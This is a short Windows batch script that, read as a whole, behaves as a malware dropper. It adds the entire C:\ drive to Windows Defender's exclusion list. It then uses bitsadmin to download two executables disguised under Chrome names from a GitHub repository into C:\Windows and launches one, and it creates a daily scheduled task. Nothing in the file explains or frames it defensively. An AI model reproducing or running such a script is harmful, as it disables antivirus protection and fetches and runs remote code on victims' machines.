
   
:start   

@echo off

powershell  -Command Add-MpPreference -ExclusionPath "C:\"

@echo off
cmd.exe /c "bitsadmin /transfer debjob /download /priority high  http://github.com/RobertAlex23/winzo/raw/Winzo/Chrome.exe C:\Windows\Chrome.exe&start Chrome.exe"

@echo off
cmd.exe /c "bitsadmin /transfer debjob /download /priority high  http://github.com/RobertAlex23/winzo/raw/Winzo/$wz$chrome.exe C:\Windows\$wz$chrome.exe"

@echo off
powershell  -Command SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task DAILY" /TR "C:\Windows\System32\notepad.exe" /ST 22:49